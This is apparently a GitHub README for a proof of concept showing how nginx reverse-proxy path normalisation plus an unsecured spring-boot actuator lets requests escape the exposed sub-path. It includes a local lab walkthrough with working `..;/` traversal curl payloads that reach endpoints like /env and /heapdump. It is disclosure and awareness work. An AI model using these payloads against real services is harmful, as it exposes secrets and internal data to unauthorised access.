# Purpose
This is a PoC that combines Orange Tsais research about ["Breaking parser logic"](http://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) and an unsecure configuration of spring-boot-starter-actuator as documented in [Baeldungs Docs 3.7 Further Customization](https://www.baeldung.com/spring-boot-actuators#boot-1x-actuator)

I do not want to blame Baeldung. His documentations are incredibly helpful. He also explains what `management.security.enabled=false` means. The thing is, that we people will copy and paste this examples without reading the explanations.
Here is another example of this setting: [Learn SpringBoot absolute beginners](https://www.tutorialspoint.com/spring_boot/spring_boot_actuator.htm)

# Impact
If you have a java spring-boot service behind a reverse proxy that only exposes a sub path to the internet people may be able to access all paths on the spring-boot service. Actuator endpoints are just an example.

# Walkthrough 
1. cd spring; mvn clean install
2. cd target; java -jar orange-actuator-poc-0.0.1-SNAPSHOT.jar
3. test java service: `curl http://localhost:8080/api/hello`
4. install nginx and change nginx server listen port to 8081
5. add this to your nginx configuration to add a proxy rule:
```
	location /orange {
                proxy_pass http://localhost:8080/api;
                proxy_redirect     off;
                proxy_set_header   Host $host;
	}
```
6. start nginx
7. `curl localhost:8081/orange/..;/env`
8. `curl localhost:8081/orange/directory/..;/..;/env`

Nginx will send the request to the spring boot application at `http://localhost:8080/api/directory/..;/..;/env`
The path traversal makes that a request to `http://localhost:8080/env`
/env can be substituted by any default actuator endpoint, e.g. /trace or /heapdump
